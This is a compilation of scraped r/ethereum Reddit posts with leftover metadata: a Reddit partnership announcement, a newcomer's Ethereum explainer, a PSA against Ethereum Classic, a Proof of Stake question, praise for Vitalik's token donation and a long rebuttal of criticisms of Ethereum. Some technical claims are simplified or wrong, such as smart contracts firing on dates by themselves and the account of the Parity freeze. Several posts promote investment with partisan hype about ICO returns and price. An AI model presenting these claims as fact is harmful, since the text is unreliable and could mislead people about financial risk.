Through this partnership, we will be increasing our commitment to blockchain, accelerating scaling and resources for the Ethereum ecosystem, and bringing the value and independence of blockchain technology to millions of redditors.In many ways, this collaboration started with the [Scaling Bake-Off](https://www.reddit.com/r/ethereum/comments/hbjx25/the_great_reddit_scaling_bakeoff/) that we hosted in this community with the Ethereum Foundation. In this new stage of our partnership, immediate efforts will be focused on bringing Ethereum to Reddit-scale production. Our intention is to help accelerate the progress being made on scaling and develop the technology needed to launch large-scale applications like Community Points on Ethereum. The scaling technology developed through this partnership will be open-sourced and publicly available for anyone to use.We introduced [Community Points](https://www.reddit.com/community-points/) last year to give more ownership and control back to users through decentralized technology. Built on Ethereum, Community Points represent a user's ownership in a community and rewards them for their individual contributions (such as posts and comments). This project is our first attempt at utilizing decentralized technology to empower individuals to have a sense of accountability and more ownership in the communities that they create and contribute to. Community Points are currently in beta on the Rinkeby network and are being tested in [r/CryptoCurrency](https://www.reddit.com/r/CryptoCurrency/) and [r/FortNiteBR](https://www.reddit.com/r/FortNiteBR/).Our blockchain efforts will be led by Reddit's Crypto team (hi!). We are currently [hiring](https://boards.greenhouse.io/reddit/jobs/2413930) great backend engineers who want to build the decentralized Internet. If you're interested in solving tough problems like scaling and bringing blockchain to millions of users, send me a PM or apply directly on Reddit's careers page -- we'd love to talk to you!We're looking forward to working closely with the Ethereum Foundation, and contributing more to the broader Ethereum ecosystem -- and we hope to share some exciting announcements over the next few months.

I'm also writing a blog that aims to explain blockchain technology simply to anyone whose interested. www.cryptoambit.comIf you guys could spot check my Ethereum post for accuracy, I'd appreciate it. If you like it, would also appreciate some subscribers! Thanks _____________________________________________By now, most people know Ethereum as the second most valuable cryptocurrency, currently valued at over $60 billion dollars. Well, it turns out that Ethereum isn't actually a cryptocurrency - it's a software platform that let's programmers build applications on top of blockchain technology. Within the ethereum platform, is a cryptocurrency called ether that is used to power applications built on the Ethereum blockchain. **From Bitcoin to Ethereum**Bitcoin uses a global network of computers that maintain a shared ledger called a blockchain that keeps track of who owns bitcoin. Once blockchain technology was introduced to the world, people realized that blockchains could be used to keep track of anything of value. In 2013, a 19 year old named Vitalik Buterin introduced the Ethereum white paper, which proposed an open source platform that would let programmers build blockchain applications that could facilitate the exchange of money, content, property, shares or anything of value. Much like with Satoshi Nakamoto's paper, Buterin's was met with widespread excitement from software developers around the world who began building toward the vision Buterin laid out.Much like Bitcoin, Ethereum isn't owned or controlled by any one person. Unlike Bitcoin, whose creator remains anonymous, Ethereum has a leader in Vitalik Buterin (pictured below). While Buterin doesn't control Ethereum in the way that a CEO does, his word carries tremendous weight in dictating the direction of the project - something that is considered a strength or a weakness, depending on who you ask.**Smart Contracts**The basic function that programs built on Ethereum perform are called smart contracts. Smart contracts are digital agreements that execute automatically based on real world data. An easy way to think of them is an 'If-then statement.' IF condition A exists, THEN perform function B. Let's say for example Grandma wants to make sure she never forgets to give Little Billy birthday money each year. She could write a smart contract that says IF it's Little Billy's birthday, THEN pay him $10 from Grandma's account. Once this contract is broadcast to the Ethereum network, it will execute automatically each year on Little Billy's birthday. Smart contracts have applications far beyond improving the reliability and efficiency of Grandmothers around the world. Another simple application of a smart contract is for rental payments: IF date = 1st of the month, THEN pay landlord rent amount. Processes that currently involve manual interactions between two parties can now be automated and the value can be moved in real time over the blockchain rather than settling days later as with traditional banking. **A Real World Example**Ethereum and smart contracts are a big deal because they have the ability to usher in what's been dubbed the 'smart economy' - one in which slow manual processes prone to human error and deceit are replaced with automated processes that are completely transparent and trustworthy. A real world example that typifies the new 'smart economy' is a project being run by a French insurance company called AXA. AXA offers a flight insurance product that pays out a policy holder in the event that a flight is delayed by two hours or more. It currently has a product in trial that will pay out insurance claims using smart contracts and the Ethereum blockchain. The smart contract is simple: IF flight is over two hours late, THEN pay policyholder. The smart contract is connected to a database that monitors flight times. If the database shows that the flight is over two hours late, the smart contract is triggered and the policyholder is paid automatically over the blockchain. Without the smart contract, the policyholder would have to file a claim and wait for the insurance company's claims department to process it, which could take anywhere from 1 to 2 weeks. With the smart contract, neither the insurance company nor the policyholder has to do anything. This also creates trust between the two parties because there are no grey areas - the customer can review the smart contract prior to purchasing the policy and feel comfortable that he will receive his claim in the event of a delay. **Ethereum vs Ether**As stated in the intro, Ethereum is a platform for building blockchain applications using smart contracts. What you may have just purchased on Coinbase is called Ether, which is the cryptocurrency that fuels the Ethereum network. Ether functions more like a digital commodity than a digital currency. Just like you need gasoline to fuel your car, you need Ether to run applications on the Ethereum blockchain. In the Grandmother example cited above, Grandma would have to purchase small amounts of Ether to fuel her smart contract that pays Little Billy his birthday money. The Ethereum blockchain functions in the same way as the Bitcoin blockchain: a network of computers run software that validates transactions through majority consensus. The people running these computers are called miners. Bitcoin miners are compensated for their resources by being paid in Bitcoin. Ethereum miners are compensated in Ether. On Little Billy's birthday, Grandma's ether transaction fee will go to whichever miner adds the block containing Grandma's transaction to the blockchain. That miner will also receive new Ether in the process.The same supply/demand economics that apply to commodities like oil and gas also apply to Ether. Oil is valuable because it powers many of the things we use in our everyday life - it heats our homes and fuels our engines. The more people and enterprises that rely on Ethereum based applications, the higher the demand will be for Ether which will increase its value. As with all cryptocurrencies, there's plenty of speculation baked into the price - speculation that the demand for Ether will increase in the future. Since Ether is valuable, exchangeable and transferable, certain merchants are also starting to accept it as a currency. **dApps - Decentralized Apps**  Applications that run smart contracts on the Ethereum blockchain are called 'dApps,' or decentralized apps. Just as any app developer can build apps on top of Apple's IOS operating system, developers can build on top of Ethereum's blockchain infrastructure. To the end user of a dApp, it might not look and feel any different than the apps you use today. It's the underlying blockchain infrastructure that make them different. Since dApps function on top of the blockchain, they can be used to transfer value peer-to-peer. To return to our Grandmother example, there could be a dApp that Granny can download that lets her schedule Little Billy's birthday payments without having to code the smart contract herself. dApps are also completely open sourced so other people can access the code and build on top of them. Someone could take the code to the birthday payment dApp and add the ability for Grandma to add a note that says, 'Happy Birthday Billy!' Running dApps on the blockchain also offers added security benefits. Since the transactions are distributed and encrypted across the Ethereum blockchain, there is no central place for a hacker to breach and gain access to all of the world's Grandmother to grandson birthday payment data. At this point, I'm really beating the Grandmother/Little Billy example to death because I think it represents a simple illustration for the kinds of applications that can be built on the Ethereum blockchain. In reality, the dApps that are being built are much more complex. Here are a few examples: * **Weifund - blockchain crowdfunding:** Users can launch traditional crowdfunding campaigns, but through the use of smart contracts, backers can gain a financial stake in the project. If an indie film gets funded on Weifund, a backer who financed 10% of the project can collect 10% of the film's revenues. Payments will be issued in real time as the film generates revenue. * **Ujo Music - Music licensing via the blockchain:** An artist can create an original song and register it on Ujo's platform and set their own licensing terms. If a film producer wants to use that song in a movie, they can purchase the rights based on the terms set by the artist who will then get paid directly. This erases the need for industry middlemen like Warner Brothers who end up taking the lion's share of their artist's profits. * **Virtue Poker - Online poker secured by the blockchain:** At the height of it's popularity, online poker platforms like PokerStars were marred with issues that ranged from deck rigging to the abuse of player funds held by the company. Virtue Poker using Ethereum allows players to fund their bets directly, insuring that no central party can access and misappropriate player money. Their code is open sourced so that users can understand how hands are dealt, insuring that no one can rig the deck. Lastly, players are paid out their winnings in real time over the blockchain so no more waiting weeks for a check to come in the mail. **Ethereum Tokens**So now that you understand that Ethereum is a network for building decentralized applications that require a cryptocurrency called Ether to run, I'm going to introduce a confusing concept. Many dApps built on Ethereum have their own cryptocurrencies or 'tokens.' In order to interact with the dApps, customers need to purchase the dApp's native token. Here's a helpful analogy I came across - when you go to a waterpark, you pay the admission fee and in return, you get a wristband. That wristband gives you the ability to ride the waterslides in the water park. With certain dApps, the token is the wristband, and a user must purchase it to interact with whatever the dApp offers. Let's take a dApp called Golem as an example. Golem lets people rent out their excess computing power to people who need it - kind of like a computer AirBnb. To cite this article from Laura Shin, if I'm a computer graphics artist that wants to render some kind of computationally intense animation, I can purchase Golem tokens that let me tap into the Golem network to generate my animation. I then pay the people who are renting me their computers with the Golem tokens. The Golem token is a form of smart contract and this transaction is recorded on the Ethereum blockchain. Since Golem tokens are also a cryptocurrency, they can be traded on the free market. If I'm a speculator who has no intention of using the Golem network to rent computing power, I can still buy the Golem token on an exchange in hopes that it appreciates in value. Like bitcoin, there is a fixed supply of Golem tokens so if the demand for the service increases, so will the value of the token. If I bought Golem at its original price of around 1 penny and held it to today, I would have made 35X my initial investment since Golem tokens currently trade around 35 cents a piece. **ICOs**ICO stands for, 'Initial Coin Offering' which is a fundraising mechanism for cryptocurrencies which has exploded in popularity this year - the majority of them are held on the Ethereum network. Similar to a kickstarter campaign, they allow entrepreneurs to raise money for projects by giving investors an early opportunity to purchase the cryptocurrency before the final product has been built. If the project is successful, the value of the cryptocurrency will rise in value and early investors can sell it on the open market for a profit.ICOs have stirred up a lot of controversy because they represent a risky proposition with zero investor protection. Let's say I wanted to build a casino and to finance it, I gave investors the opportunity to buy chips that can be used at my roulette tables once the casino opened. If you bought $100K in roulette chips from me and I decide that I no longer want to build the casino, you're stuck holding worthless chips. If investors don't do their due diligence, they may end up buying tokens for a project whose creators never intended on building it in he first place - the creators walk away with the money and the investors have no way of recouping their funds. On the other hand, early investors in projects that go on to be successful have the opportunity to make enormous returns. For example, people who invested $1,000 in the Golem ICO would be sitting on $35,000 at it's current price of $0.35 - if it ever goes to $10, they're all millionaires. Another positive aspect of ICOs is that they let anyone, rich or poor get involved in early stage investing. To invest in a company like Twitter or Facebook pre-IPO (initial public offering), you need to be an accredited investor - this basically means you're already a rich person. With ICOs, all you need is an internet connection and a little bit of money and you have the potential to become wealthy by investing in the right projects.**Far From Perfect**Ethereum has the potential to change the way humans transact with one another but it is still a very young technology and it hasn't been without its problems. While the blockchain architecture underlying the Ethereum network is secure, not all of the applications built on top of it are. Faulty code can and has made applications vulnerable to hacking and malfunctions. Here are two prime examples: **DAO Hack** - DAO was a dApp built on Ethereum that enabled crowd based venture capital. DAO token holders were given the right to vote on projects they wanted to support - if projects went on to be successful, DAO token holders would receive financial rewards. The DAO ICO received $168 million in funding. The DAO software was hosted on the Ethereum blockchain and was publically visible by all. A hacker spotted a flaw in the DAO's code that enabled him to route $55M in ether held by the DAO into an account that he controlled. The Ethereum team had do do something called a hard fork (something I won't get into now) to reverse return the stolen funds.**Parity Wallet Freeze** - Parity is a wallet where people store Ether. A flaw in Parity's code let a user delete a specific line of code that was necessary for accessing funds in a Parity wallet. This led to $280 million dollars worth of ether being frozen - it hasn't been stolen but it can't be accessed either. Parity Technologies has proposed another hard fork to correct the issue - something that is sure to divide the Ethereum community and rattle user confidence. Despite the world changing implications that Ethereum dApps and smart contracts have, the trouble is that any programmer can write them - if they aren't written properly, they can behave in unintended ways and be exploited like in the above listed examples. Ethereum is still a very young network and security issues with dApps and smart contracts will have to be sorted out if its to reach its true aspirations. **Leading The Decentralized Revolution**Ethereum aims to take the promise of decentralization, openness and security that is at the core of blockchain technology and brings it to almost anything that can be computed. - Vitalik Buterin With dApps, smart contracts and blockchain technology, Ethereum is leading the decentralized revolution. Bitcoin is the world's first decentralized currency, that operates on a global network of computers outside of central intermediaries. Ethereum gives programmers a platform to develop a decentralized version of just about anything.Decentralized networks like Ethereum have the power to remove the intermediaries that currently exist between producer and consumer. Let's take a company like Uber. Uber is a platform that brings people who need rides together with people who have cars. To facilitate this interaction, Uber collects 20% of every ride. With Ethereum and blockchain technology, there is nothing to prevent a bunch of software developers from writing a dApp that creates a decentralized Uber. Instead of 20% per ride, transaction fees are paid to the network and the driver takes home the lions share of the transaction. Tokens can be issued that represent ownership in the network. Coders who work on improving the network can get paid for their efforts in ownership tokens. Non-technical people can come up with marketing campaigns that spread awareness for the network and also get compensated in ownership tokens. As the decentralized Uber network grows and improves, the value of its ownership token increases, rewarding the people that built it. The result is whats referred to as a 'Decentralized Autonomous Organization' and theres a strong possibility that DAOs replace a lot of the world's biggest corporations. This may sound like a radical concept but blockchain technology enables these kinds of decentralized organizations to exist - Ethereum provides the tools for people to go out and build them.",False,r/Ethereum - I wrote this to explain Ethereum in depth to newbies.

Here are some facts.**= Origins =*** In 2016, a major smart contract on Ethereum with 14% of all extant ETH locked up in it (The DAO) suffered a hack (a bug with the smart contract, not a bug with Ethereum) that resulted in much of the ETH being stolen. The Ethereum community was split on what to do, and eventually there was a [controversial hard fork](https://www.gemini.com/cryptopedia/the-dao-hack-makerdao#section-the-response-to-the-dao-hack).* The **HARD FORKED** chain (with all the hacked ETH put into a different, safe smart contract for withdrawal by its original owners) became today's **Ethereum** chain. Ethereum has not conducted any further chain-state-changing hard forks after that point.* The **UNCHANGED** chain (with the attacker keeping the stolen funds) became **Ethereum Classic**.**= Network Effects and DeFi =*** The large majority of the Ethereum community decided that Ethereum was the legitimate chain. As a result, it has subsequently seen the vast majority of development and usage compared to Ethereum Classic, and all of the DeFi and other dApps we have come to know and love are built on Ethereum, **NOT** Ethereum Classic. Thousands of interconnected dApps exist on Ethereum.* By comparison, almost no development has taken place on Ethereum Classic. Developers want to go where all the other developers are, and that is *not* Ethereum Classic.**= Security =*** Ethereum is one of the most secure decentralized chains out there, along with Bitcoin.* Ethereum Classic has a tiny fraction of the hash rate that Ethereum does (under 2% until the past few days), leaving it vulnerable to 51% attacks, [four of which](https://www.coindesk.com/ethereum-classic-blockchain-subject-to-yet-another-51-attack) have happened so far. This is where an attacker buys or rents a bunch of hashpower, takes over the chain and executes invalid transactions for their own financial gain. It means the blockchain is fundamentally worthless (the entire point of a blockchain is to be trustlessly secure). These attacks were subsequently rolled back (ironically, given ETC's founding principle of not changing what happens on-chain), but not before weeks of headaches and lost transactions.**= Upgrades =*** Ethereum has received regular hardforks over its history. These hardforks have added features to Solidity (the programming language on both chains), fixed problems with the cryptoeconomic model, and improved user experience (UX), among many other changes. Soon, Ethereum will be transitioning to Proof of Stake, the most major upgrade since the chain was started.* Ethereum Classic has copied over some of these same hardforks from Ethereum, but also has added others that have led to it diverging from Ethereum. Importantly, it will not be transitioning to Proof of Stake or reaping any of the benefits from the other set of upgrades that were formerly collectively termed 'Eth2'.All of these reasons are why Ethereum currently has a much higher market cap than Ethereum Classic, and as a result, a higher price per coin. They are **NOT** 'the same chain'. Ethereum Classic is **NOT** 'the same but cheaper'. Ethereum has fantastic fundamentals, and Ethereum Classic has none. 'Price go up' is not a fundamental.Do with that information what you will.P.S. for more, please see [this post](https://old.reddit.com/r/ethtrader/comments/n6ecr4/ethereum_classic_is_not_classic_and_it_is_not/) in r/EthTrader",False,"PSA: Ethereum Classic (ETC) is a dead, insecure chain with no fundamental value",,31,3338,0.93,https://www.reddit.com/r/ethereum/comments/n6k7xi/psa_ethereum_classic_etc_is_a_dead_insecure_chain/,[]

Why only 1 second?Intuitively, it would seem to me that Proof of Stake (PoS) should be able to drastically reduce block times vs. Proof of Work since it replaces the computationally expensive PoW piece and the arms race nature of everyone mining at the same time with random validator assignment. Thus the bottleneck under PoS would only be the network latency it takes to propagate the newly created block to the number of validators required for consensus (51%?) + time it takes for those validators to validate/attest that newly created block and propagate their attestation back to everyone else. I don't know what the block propagation latency on ethereum is to reach 51% of nodes, but I can't imagine that being more than a few seconds.I understand that reducing block times too low under Proof of Work would be offset by increased computational waste and forking (due to everyone mining concurrently and network latency). But wouldn't this problem be eliminated under Proof of Stake, thus enabling faster block times (and subsequently higher transactions/second)? **(EDIT: I elaborated on my reasoning in** [**this comment**](https://www.reddit.com/r/ethereum/comments/slzfsd/comment/hvtw4et/?utm_source=reddit&utm_medium=web2x&context=3)**)**Is there a detailed explanation/analysis somewhere comparing Proof of Stake vs. Proof of Work from a performance standpoint?

Now onto the reasons why this was a really smart move:1. The end of Meme Investing and people falling into the pump and dump crypto schemes. Vitalik, by donating the Shibacoins away, crashed the price immediately after the announcement was made. Now onto the reason why 'meme coins' are bad. Meme coins are a shell of a useless ERC-20 token that anyone could make in minutes if they were willing to spend $200 upfront. The creators of these tokens then pay influencers on social media apps, pumping up the price; when the price is high enough, they sell, causing a massive crash as everyone runs to the doors to exit their position. 'Meme coins' should be completely purged from the crypto space, I myself take investing to be an extremely serious topic, therefore I believe the cryptocurrency space should be kept for only serious projects that are providing value to society.2. The second reason why the donation was a smart play is that the country he donated Shibacoins to, India, had been planning on banning cryptocurrencies as a whole. With the donation being in an ERC-20 token, India would have no choice but to take the money as crypto, therefore improving the chances of the country re-allowing cryptocurrencies for its residents. This is bullish news for the crypto space in general, India being the second most populated country in the world would mean there would be more money being injected into crypto.3. The third and final reason, which is probably the least important and probably not good news (to miners) is that with the dump of the tokens, gas fees would be lowered. This is good news for all users of Ethereum as gas fees were trending at all-time highs the past few days, and with the announcement of the donation this morning, the gas fees have already gone down to around 120 gwei. TLDR: With the donation of the Shibacoins, Vitalik effectively has begun a fight against meme pump and dump coins, began a campaign to re-allow cryptocurrency use in India and lower the transaction gas fees.",False,Why Vitalik Made a 500 IQ Play Today With the 1 Billion Dollars Donation,,20,2742,0.95,https://www.reddit.com/r/ethereum/comments/nb963i/why_vitalik_made_a_500_iq_play_today_with_the_1/,[]

I will, of course, revise my opinion for factual errors or oversights.Everything in this post is public domain, feel free to share it with anyone in parts or in entirety, cross-post them, riff on them etc. I don't need any credit - I just want to do my part in quelling the rampant balderdash that pervades this space. (PS: I tried posting this in r/cc and r/ethereum and as expected, they were removed. So if you know what's required to get such a post approved, please feel free to repost.)Special shoutout to r/ethfinance folks for contributing questions.# Ethereum can't scaleThis is demonstrably false because there are multiple rollups currently online, some of which have been running for a year now! Here are some examples that you can use today: Loopring, zkSync, DeversiFi, Hermez, Aztec, dYdX, Immutable X etc. Most of these projects can process thousands of TPS with such low gas fees that some of them subsidize it (or abstract it away from UX), so the users effectively pay zero gas.What's missing are generalized programmable rollups. Optimism has been live on mainnet since January, but is currently restricted to only Synthetix. Uniswap V3 is the next major release on Optimism, before finally opening it up for public smart contract deployment in July or later. By the way, Optimism have done a *terrible* job with communications this year - criticism is certainly due here. Engineering-focused project or not, communications & public relations are always important.But Optimism is just one solution. Other solutions like zkSync 2.0, Arbitrum and StarkNet will be rolling out over the course of the year, and we have more like OMGX and Cartesi joining the fray. Indeed, it now seems likely Arbitrum will be publicly available ahead of Optimism. Not to mention sidechains or commitchains like Polygon or xDai, or other EVM chains like BSC or Avalanche. Ultimately, all of these are part of the extended Ethereum ecosystem.At the same time, this is also partially true. I will note that Ethereum L1 gas fees will likely remain high forever, short of some exotic technology that doesn't yet exist. Even on rollups, you're not going to get dirt cheap fees until data sharding is released, which is a couple of years away, and even that won't be enough long term. And that's just fine... There's simply overwhelming demand for EVM blockspace.Related: [Opinion: Rollups are 4th gen blockchains : CryptoCurrency (reddit.com)](https://www.reddit.com/r/CryptoCurrency/comments/my0h9s/opinion_rollups_are_4th_gen_blockchains/)# High gas fees will kill EthereumThis is one of those bizarre comments that pervades through crypto retail doesn't seem to make any sense. Overwhelming demand for a product will somehow... kill a project? It's like saying AMD and Nvidia are going to die soon because graphics cards are now grotesquely overpriced.No, the reality, like I said above, is that there's overwhelming demand for EVM blockspace and a limited supply of gas. Currently, the high fees shows there's incredible demand for Ethereum L1 blockspace, and people are willing to pay a steep premium for it.**This is what gives the Ethereum network and ETH value. And in two months' time, there'll be a mechanism with EIP-1559 to accrue this value to every ETH stakeholder.**Over time, we will see gas fees drop with a greater supply of gas - the reality is that there'll never quite be enough blockspace supply to satisfy global demand for EVM blockspace long term. There'll be rollups, there'll be hybrid solutions like zkPorter/Validium, there'll be sidechains/alternate chains, and there'll be centralized solutions. The ecosystem will work together to offer different trade-offs with decentralization versus transaction fees.# Ethereum is centralized, all decisions are made by VitalikWhile Vitalik remains an important part of the Ethereum ecosystem, Ethereum development has become sufficiently decentralized over time. Unique to Ethereum is a multi-client approach, where researchers work with developers to create plain text specifications. These specifications are then implemented by multiple client developers who work independently. This is different to all other blockchain projects where the core team develops a single client. Now, of course, there are arguments for a single client - putting all resources into one client could make for a higher quality client than 4 or 5 not-as-high-quality client, but this is clearly the most decentralized approach. For example, there are currently 4 consensus layer clients in production, and 1 more in development - all developed by teams independent of the Ethereum Foundation (apart from receiving grants). For any consensus forks, these 5 development teams have to agree on upgrades, and then 135,000+ validators do as well. This is not how a centralized network functions. Not to mention Ethereum's strong 'Layer 0' that all developers and validators listen to intently - its community. For example, EIP-1559 has been significantly motivated by the will of the community.# Ethereum was premined. Ethereum is controlled by Vitalik. (u/aaqy, u/ec265)I'm not a fan of ICOs, and Ethereum certainly did have one. I don't like ninja mining either, like Bitcoin. We have seen some DeFi projects have fair launches with airdrops to users, and this is certainly the best way to distribute tokens.However, It's important to understand the context - back in 2014 this was simply the fairest way to raise funding. At genesis, Ethereum Foundation held '~12M ETH. However, over the years, this has been distributed - a lot of it seems to be fundraising in the early years. Currently Ethereum Foundation and early developers hold '~2% of the supply at most. Vitalik owns 0.3% of all ETH.Contrast this with other projects where the founders often hold 20% or more, public corporations like Tesla or Amazon with a similar amount, or Satoshi holding 5% of all BTC. (Was as high as 50+% in 2009/10, and yes, they are assumed lost and not comparable anyway.) I would even go ahead and say that 0.3% is absolutely not enough to adequately incentivize a founder to keep working on the project!Would I have preferred to see Ethereum do a fairer launch? Sure. But today, in the here and now, Ethereum has the fairest distribution among founders of any project.# Mining is destroying the environmentWhile there are nuances to do this, this one's actually true to an extent - mining is highly inefficient. Fortunately, Ethereum is moving to proof-of-stake within the next 9 months, which will cut Ethereum's energy consumption by 99+%.It's not just about electricity either. We know there's a significant global shortage for semiconductors right now. A lot of TSMC's limited wafer supply currently being used to fabricate mining-related silicon (ASICs, GPUs) can be reallocated towards CPUs, ASICs and GPUs more productive usecases like engineering, science, and of course, gaming.# Ethereum did a rollback and will do it againPeople like to point to the DAO fork as proof that Ethereum is not immutable. But there are many nuances to this that are disingenuously ignored:'- Firstly, the DAO fork was not a rollback. It was a unique situation where the hackers had to wait 28 days for withdrawals, so a smart contract change was executed.'- There was strong consensus across developers, users, miners and community alike - it was hardly a centralized decision.'- Those who disagreed simply moved to Ethereum Classic. It's a win-win situation for all.'- Ethereum was still a very, very new project then. You know which other project did a rollback when it was less than 2 years old?  [Value overflow incident - Bitcoin Wiki](https://en.bitcoin.it/wiki/Value_overflow_incident)'- [EIP-999 being rejected](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-999.md) is the final deathblow to this hypothesis. There was a chance to rollback 500,000 ETH to an entity managed by one of its co-founders, and the community overwhelmingly rejected it. **Rollbacks do not happen on Ethereum.**# Ethereum relies on InfuraWhile it's certainly true that Infura is a dominant service provider, and the ecosystem definitely needs to diversify, this is demonstrably false. Infura [suffered a massive outage in November 2020](https://blog.infura.io/infura-mainnet-outage-post-mortem-2020-11-11/), yet Ethereum kept running just fine. Sure, it disrupted some frontends, exchanges and wallets, but nothing that couldn't be fixed with simply running your own node or using a different service. Since this outage, many frontends and wallets have started running their own nodes and using alternatives like Alchemy. There's still more work to do on this front, but to say Ethereum is reliant on Infura is false.# Ethereum state is growing too fastCompared to Bitcoin, this is certainly true. If you want a chain that's easiest to play back in archival mode, verify every transaction from genesis, then yes, Bitcoin is a better option. It's just a question of how valuable this really is - given you're trusting Bitcoin miners already if you want to use their network? With Ethereum, you can run full nodes (not archive) on a Raspberry Pi 4 with a 1 TB SSD, and send and verify transactions. This is relatively accessible hardware to most users and consumers. Some would argue that clients like TurboGeth makes this easy enough even for archive nodes.On a related note, Ethereum's state growth is much, much closer to Bitcoin than Binance Smart Chain, EOS, Solana or other high-TPS L1 chains. The concept of users verifying transactions don't even exist for these chains.As a side note, Ethereum will make more such trade-offs going forward with weak subjectivity, statelessness, state expiry etc. Purists will cry foul, and that's fine - there'll be an audience that will gladly trade-off being able to sync from genesis given the tremendous benefits elsewhere.# Ethereum has no fixed capThis is true, but there are good security reasons for it. I'd add that with EIP-1559 and The Merge, it is somewhat likely ETH will hit a maximum supply of around '~120M and continue deflating or stabilising from there.# Ethereum's monetary policy is unreliableThis is also partially true. While many exaggerate, it is true that Ethereum has seen 2 cuts in block rewards, and these were made by social consensus rather than code. EIP-1559 and The Merge completely overhaul Ethereum's monetary policy. But yes, until EIP-1559 and The Merge prove themselves on mainnet without further changes over several years, this remains a valid criticism. Bitcoin remains the standard for predictable and reliable monetary supply - though it does trade-off with a security risk in the future.# Ethereum 2.0 is years awayThere are a lot of misconceptions about 'Ethereum 2.0', though the Ethereum researchers an developers are largely to blame for confusing communications. Firstly, we don't even call it that anymore. Anyway, this just refers to a series of upgrades. The first upgrade, beacon chain, went live in Dec 2020, The Merge is actively being developed (the second devnet is going live today) and scheduled to release by late 2021. Next comes data sharding. Another misconception is these upgrades will lead to low gas fees - definitely not on L1. What data sharding will do is accelerate rollups. A much greater impact to L1 will be statelessness+state expiry, plus sharding execution if it's ever required. (The jury's now out on that one...)# Ethereum has no intrinsic value, it's all created from thin airEthereum is a global, decentralized SaaS platform and collects revenues in transaction fees. These transaction fees are now substantial - over $1 billion per month. Indeed, yesterday, Ethereum generated $117M ([cryptofees.info](https://cryptofees.info)), which is $43B annualized. This would put Ethereum as #2 compared to the largest corporations in the world. I don't think this sort of activity is sustainable for now, but it shows you that it's possible, and gives you a glimpse into the future.With EIP-1559 releasing in July, a majority of these transaction fees will be burned, directly accruing value to all ETH stakeholders. Following The Merge, the remaining non-burned fees (tips) will be returned to stakers, in addition to the yield they generate.Not only is Ethereum one of the most productive assets in the world, it also has the most advanced accrual mechanisms.# It is too difficult to stake ETHThis is definitely valid, 32 ETH is a lot of money. However, I think there's a significant misconception about what staking is. On many of the delegated-type chains, when you're 'staking' what you're actually doing is just delegating to someone else. Some newer models like Algorand randomizes this process, but you're still delegating, rather than validating. You're effectively being given free money for not really doing anything. Early delegated-type systems like BitShares or EOS never paid delegators, so the validators ended up bribing delegators. The new delegated-type systems simply 'pre-bribe' delegators. Of course, validators can still bribe delegators from their rewards, but that's a separate discussion.In Ethereum beacon chain, you are validating your own ETH, and thus earning staking fees for providing a service to the network.Those that just want to stake and don't care about these technicalities, beacon chain is just the base layer, and we have multiple staking services being built on top of it, with various levels of decentralization. These staking services let you earn staking rewards for small amounts of ETH. See the full list here:  [Ethereum 2.0 Beacon Chain (Phase 0) Block Chain Explorer - Ethereum 2.0 Staking Services Overview - beaconcha.in - 2021](https://beaconcha.in/stakingServices)# Ethereum never executes upgrades on time and constantly change their plans (u/I_haven-t_reddit)Does Ethereum constantly change their plans? Yeah, that's definitely true. But it's simply pragmatic. This industry is innovating rapidly, and when you have exponential advancements, it doesn't make any sense to just stick to old tech. Abandoning the hybrid PoW/PoS makes sense, even if it means you lose out a year or so of research. Going for a rollup-centric roadmap makes sense, simply because it'll deliver massive scalability sooner than anyone imagined. Upgrades are definitely being executed - the beacon chain went live in Dec 2020, EIP-1559 happens in two months' time, and The Merge goes less than 6 months after that.A perfect counter case would be Cardano, which is basically obsolete 2015-era tech. DPoS, single-ledger, relying on state channels and sidechains for scalability. By rejecting significant advancements like signature aggregation, sharding and rollups, they are destined to be stuck in the past. OK, maybe that's a poor example because despite being obsolete they still can't execute. Seriously, though, the actual counter case is, of course, Bitcoin. And that's just fine - a model like that makes sense for something that just wants to be money and nothing else.# Proof-of-stake increases centralization by concentrating wealth (u/epic_trader, u/Mathje, u/sn00fy)While this seems to make sense at first glance, there are many nuances to this:'- Ethereum has had the benefit of 6+ years of proof-of-work, and we've seen significant token distribution in that time. Now, the distribution is relatively decentralized and second only to Bitcoin.'- Validators and (non-validating) stakers have costs too. While hardware costs are significantly lower, there'll be taxes and overheads which will be redistributed.'- The biggest factor often overlooked is that proof-of-stake has very, very low issuance. When The Merge happens, issuance will be '~0.5%. A validator cap is being proposed which will also subsequently cap issuance at only 0.8% or so.Proof-of-work may still have better redistribution characteristics, but it's marginal at best.# Even if companies adopt Ethereum they will just run a private chain (u/sn00fy)Not just companies, but we're going to see private chains being run for consumers. We are already seeing some of this with Binance Smart Chain, but in the future, I'd speculate have big players like governments, banks, and corporations run private chains.Naturally, there'll also be business adoption for the public chain with B2B activities.Like I alluded to at the very beginning, only a very limited amount of gas will be consumed on the Ethereum L1 chain long term. But that doesn't matter - L1 will be 100% saturated at all times, and other solutions building with Ethereum only adds to its network and Lindy effects.# Ethereum has old tech, new chains have newer tech (u/Mathje)Of all the misinformation and FUD that pervades this space, this is the one that grinds my gears the most. Ethereum has always been at the bleeding edge of innovation, and continues to be. While there are certainly innovative projects in the space, absolutely nothing is even attempting to solve the big problems: the blockchain trilemma. Consider this: every other smart contract chain uses some form of delegated-type consensus mechanism, many with a hard cap on number of validators. Cosmos: 300 (currently 150); Polkadot: 1,000; Binance Smart Chain/EOS: 21. The ones that end up with more validators have to compromise on scalability.Beacon chain uses revolutionary new techniques like weak subjectivity and signature aggregation to enable massive decentralization with up to a million validators. There are 135,000 validators live already despite being none more than an incentivized testnet, with thousands being added every week. Not to mention, beacon chain validators are not required to be online 24x7 like the other chains.Or, consider this: these L1 chains can offer more throughput than Ethereum's '~55 TPS for ETH transfers, or '~20 TPS overall, sure. But Ethereum is empowering rollups with data sharding to scale to 100,000 TPS and beyond, with groundbreaking new tech (data availability sampling) securing it all without compromising decentralization. No L1 will ever scale to these levels, even after absolutely giving up on decentralization. Not even considering hybrid solutions like zkPorter or Validium.Or, consider this: the most innovative chains are actually rollups. Just look at the phenomenal work being done by StarkNet. There's a good reason they are becoming rollups on Ethereum and not anywhere else - it has the best consensus mechanism in the industry.Or, consider this: Pretty much every innovative new smart contract is released on Ethereum, and then copy-pasted to other chains.In short, the Ethereum ecosystem has far and away the most cutting-edge tech in the industry.# There is no real use case for Ethereum. It's only used by degens for gambling and exchanging other tokens that are just as useless. (u/sn00fy)Degens are paying transaction fees just like everyone else - the whole point of credible neutrality and permissionless means Ethereum does not discriminate what people use the chain for.That said, it is certainly concerning that a lot of activity on Ethereum seems to be speculative. This is, of course, true of all early tech. We're definitely seeing real adoption from big players as well - I don't need to repeat all the news about Visa, EIB 